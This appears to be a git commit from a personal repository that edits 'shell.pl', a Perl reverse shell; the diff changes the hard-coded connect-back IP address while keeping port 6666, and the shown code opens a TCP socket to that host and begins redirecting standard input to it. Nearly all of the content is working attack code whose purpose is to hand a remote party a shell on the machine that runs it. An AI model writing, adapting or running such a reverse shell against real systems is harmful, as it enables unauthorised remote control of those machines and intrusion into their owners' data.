849f846f5a022f44da04fa34f01dbcf21ce8ca9b
MattyW11 <matthewwllms17@gmail.com>
2021-01-18 16:42:24 +0000

    Update shell.pl

--- shell.pl
+++ shell.pl
@@ -1,6 +1,6 @@
 #!/usr/bin/perl -w
 use Socket;
-$i="10.10.14.85";
+$i="192.168.0.22";
 $p=6666;
 socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));
 if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");
